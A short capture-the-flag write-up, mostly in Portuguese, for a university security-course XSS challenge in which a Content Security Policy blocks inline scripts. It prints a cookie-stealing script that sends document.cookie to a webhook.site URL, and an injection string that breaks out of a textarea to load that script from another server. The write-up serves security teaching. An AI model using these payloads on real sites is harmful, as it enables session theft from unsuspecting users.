# Challenge `Read_my_lips:_No_more_scripts!` writeup

- Vulnerability: What type of vulnerability is being exploited
  - XSS
- Where: Where is the vulnerability present
  - A Content Security Policy não bloqueia a execução de ficheiros remotos
- Impact: What results of exploiting this vulnerability
  - Permite executar o meu script num servidor diferente daquele que estou e obter cookies

## Steps to reproduce

1. Tentei executar o payload do exercício anterior o que não deu visto que a Content Security Policy bloqueia os scripts inline, então tive de colocar o script num sítio diferente do site
2. Coloquei o ficheiro a ser executado na diretoria web do sigma `let xhr = new XMLHttpRequest();xhr.open('GET', 'https://webhook.site/a5e60fa1-0388-445e-8be8-73d20a70bb08?cookie='+document.cookie);xhr.send();` 
3. Por fim foi executar o payload `</textarea><script src="http://web.tecnico.ulisboa.pt/ist196902/ssof.js"></script><textarea>`
